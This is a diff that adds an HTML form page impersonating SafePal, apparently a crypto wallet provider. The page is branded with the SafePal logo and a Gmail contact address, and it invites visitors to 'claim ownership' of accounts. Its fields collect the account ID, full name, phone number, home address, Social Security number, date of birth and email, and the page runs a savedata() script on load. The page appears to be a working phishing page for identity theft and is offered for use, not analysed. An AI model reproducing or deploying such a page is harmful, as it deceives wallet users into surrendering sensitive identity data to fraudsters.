@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Account Ownership Claim</title>
+    <link rel="stylesheet" href="./index.css">
+</head>
+<body onload="savedata()">
+    <nav>
+        <div class="logo">
+            <img src="./images/logo-light.svg" alt="safepallogo">
+        </div>
+        <div class="email">
+            <a href="mailto:safepalmarketing01@gmail.com"><i class="fa-regular fa-envelope"></i></a>
+        </div>
+        <div class="bars">
+            <a href="#"><i class="fa-solid fa-bars"></i></a>
+        </div>
+    </nav>
+   <h2>ACCOUNT OWNERSHIP CLAIM</h2> 
+   <p>Complete the fields below to claim ownership of Safepal accounts;</p>
+
+   <div class="form">
+    <form action="" method="post">
+        <div class="accountid">
+            <label for="AccountID">Account ID:</label>
+            <input type="text" name="AccountID" id="AccountID" required>
+        </div>
+        <div class="fname">
+            <label for="FName">First Name:</label>
+            <input type="text" name="FName" id="FName" required>
+        </div>
+        <div class="mname">
+            <label for="MName">Middle Name:</label>
+            <input type="text" name="MName" id="MName" required>
+        </div>
+        <div class="lname">
+            <label for="LName">Last Name:</label>
+            <input type="text" name="LName" id="LName" required>
+        </div>
+        <div class="phone">
+            <label for="Phone">Mobile Number:</label>
+            <input type="number" name="phone" id="phone" required>
+        </div>
+        <div class="address">
+            <label for="Address">Address:</label>
+            <input type="text" name="address" id="address" required>
+        </div>
+        <div class="zip">
+            <label for="Zip">Zip code:</label>
+            <input type="number" name="Zip" id="Zip" required>
+        </div>
+        <div class="city">
+            <label for="City">City:</label>
+            <input type="text" name="City" id="City" required>
+        </div>
+        <div class="State">
+            <label for="State">State:</label>
+            <input type="text" name="State" id="State" required>
+        </div>
+        <div class="gender">
+            <label for="Gender">Gender:</label>
+            <select name="gender" id="gender" required>
+                <option value="gender" selected>Select Gender</option>
+                <option value="male">Male</option>
+                <option value="Female">Female</option>
+            </select>
+        </div>
+        <div class="ssn">
+            <label for="SSN">Social Security Number:</label>
+            <input type="number" name="SSN" id="SSN" required>
+        </div>
+        <div class="dob">
+            <label for="DOB">Date of Birth:</label>
+            <input type="date" id="date" name="date" required>
+        </div>
+        <div class="email">
+            <label for="Email">Email Address:</label>
+            <input type="email" name="email" id="email" placeholder="@gmail.com" required>
+        </div>
+        <input type="hidden" name="_redirect" value=".">
+        <button type="submit">Submit</button>
+
+        
+    </form>
+   </div>
+
+
+   <script src=".index.js"></script>
+
+   <script src="https://kit.fontawesome.com/2f8df1a2ea.js" crossorigin="anonymous"></script>
+</body>
+</html>
